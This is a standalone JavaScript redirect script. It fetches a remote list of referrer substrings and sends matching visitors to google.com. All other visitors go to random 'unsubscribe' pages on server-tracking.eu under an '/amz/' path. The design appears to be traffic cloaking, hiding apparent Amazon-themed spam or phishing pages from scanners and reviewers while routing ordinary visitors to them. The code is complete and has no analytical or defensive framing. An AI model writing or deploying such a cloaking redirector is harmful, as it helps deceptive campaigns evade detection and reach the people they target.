// Static redirect URL for all matching substrings
const staticRedirectUrl = "https://www.google.com";

// List of URLs
const urls = [
    "https://server-tracking.eu/amz/unsubscribe-012024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-012024-02.html",
    "https://server-tracking.eu/amz/unsubscribe-012024-03.html",
    "https://server-tracking.eu/amz/unsubscribe-012024-04.html",
    "https://server-tracking.eu/amz/unsubscribe-022024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-032024-02.html",
    "https://server-tracking.eu/amz/unsubscribe-032024-03.html",
    "https://server-tracking.eu/amz/unsubscribe-032024-04.html",
    "https://server-tracking.eu/amz/unsubscribe-032024-05.html",
    "https://server-tracking.eu/amz/unsubscribe-032024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-042024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-042024-02.html",
    "https://server-tracking.eu/amz/unsubscribe-042024-03.html",
    "https://server-tracking.eu/amz/unsubscribe-042024-04.html",
    "https://server-tracking.eu/amz/unsubscribe-052024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-052024-02.html",
    "https://server-tracking.eu/amz/unsubscribe-062024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-072024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-122023-01.html",
    "https://server-tracking.eu/amz/unsubscribe-112024-01.html"
];


// Function to handle redirection
function redirectToRandomUrl(substrings) {
    let referrer = document.referrer;
    console.log('Referrer:', referrer);  // Print the referrer for debugging

    // If referrer is empty, use the current URL instead
    if (!referrer) {
        referrer = window.location.href;
        console.log('Referrer is empty, using current URL:', referrer);
    }

    // Check if the referrer contains any of the substrings
    if (substrings.some(substring => referrer.includes(substring))) {
        console.log(`Redirecting visitor from referrer ${referrer} to ${staticRedirectUrl}`);
        window.location.href = staticRedirectUrl;
        return;
    }

    // Redirect to a random URL if no substring match
    if (!urls || urls.length === 0) {
        console.error("No URLs available for redirection.");
        return;
    }

    const randomIndex = Math.floor(Math.random() * urls.length);
    const randomUrl = urls[randomIndex];

    console.log(`Redirecting to: ${randomUrl}`);
    window.location.href = randomUrl;
}

// Load substrings from JSON file and execute redirection
fetch('https://hellonetwork2023.github.io/sc/substrings.json')
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
    })
    .then(data => {
        const substrings = data.substrings || [];
        console.log('Loaded substrings:', substrings);

        // Execute the redirection logic with loaded substrings
        redirectToRandomUrl(substrings);
    })
    .catch(error => {
        console.error('Error loading substrings:', error);

        // Fallback to random redirection if substrings fail to load
        redirectToRandomUrl([]);
    });
